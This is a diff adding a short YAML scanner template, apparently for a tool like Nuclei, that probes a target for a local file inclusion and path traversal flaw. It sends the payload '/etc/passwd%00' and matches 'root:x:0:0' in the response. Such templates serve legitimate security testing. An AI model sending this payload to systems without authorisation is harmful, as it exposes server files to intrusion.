@@ -1,0 +1,20 @@
+id: lfi6-0802
+name: 'Traversal in path'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via path'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      path:
+        - '/etc/passwd%00'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
